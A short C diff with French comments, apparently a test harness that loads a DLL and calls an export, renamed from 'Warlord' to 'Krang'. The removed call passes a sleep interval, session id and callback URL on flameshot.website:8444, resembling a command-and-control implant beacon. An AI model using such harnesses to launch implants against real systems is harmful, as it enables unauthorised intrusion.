@@ -19,23 +19,18 @@ int main() {
         printf("sleep en c\n");
         sleep(1); // Pause de 1 seconde
     }
-
-    // Typedef avec les arguments
-    typedef void (*OverlordFunc)(unsigned long long sleep_time, const char* session_id, const char* url);
-
     // Obtenez l'adresse de la fonction 'Overlord'
-    OverlordFunc Overlord = (OverlordFunc)GetProcAddress(dll_handle, "Warlord");
+    OverlordFunc Overlord = (OverlordFunc)GetProcAddress(dll_handle, "Krang");
     if (!Overlord) {
-        printf("Failed to find 'Warlord' in DLL\n");
+        printf("Failed to find 'Krang' in DLL\n");
         FreeLibrary(dll_handle);
         return 1;
     }
 
-
     // Appelez la fonction
-    printf("Calling 'Warlord' with args...\n");
-    Overlord(1ULL, "yolo", "http://flameshot.website:8444/login.php");
-    printf("'Warlord' was called successfully.\n");
+    printf("Calling 'Krang'...\n");
+    Overlord();
+    printf("'Krang' was called successfully.\n");
 
     FreeLibrary(dll_handle);
     return 0;
